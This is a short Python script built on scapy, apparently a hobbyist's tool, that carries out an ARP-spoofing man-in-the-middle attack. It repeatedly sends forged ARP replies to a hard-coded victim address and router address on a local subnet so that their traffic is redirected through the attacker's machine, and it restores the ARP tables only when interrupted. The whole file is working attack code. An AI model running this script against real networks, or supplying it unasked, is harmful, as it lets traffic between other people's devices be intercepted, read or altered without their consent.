# Developed by Mightythor445
import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False, iface="eth0")[0]
    return answered_list[0][1].hwsrc

def spoof(targetIP, spoofIP):
    target_mac = get_mac(targetIP)
    if not target_mac:
        print("[-] No Target Mac found...... Not sending packet")
    else:
        packet = scapy.ARP(op=2, pdst=targetIP, hwdst=target_mac, psrc=spoofIP)
        scapy.send(packet, verbose=False)


def restore(destination, source):
    destination_mac = get_mac(destination)
    source_mac = get_mac(source)
    packet = scapy.ARP(op=2, pdst=destination, hwdst=destination_mac, psrc=source, hwsrc=source_mac)
    scapy.send(packet, count = 4, verbose= False)

victim = "192.168.137.129"
router = "192.168.137.2"
try:
    counter = 0
    while True:
        counter += 2
        spoof(victim, router)
        spoof(router, victim)
        print("\r[+] Packets Sent: " + str(counter)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C \n Resetting ARP Tables.......")
    restore(victim, router)
    restore(router, victim)
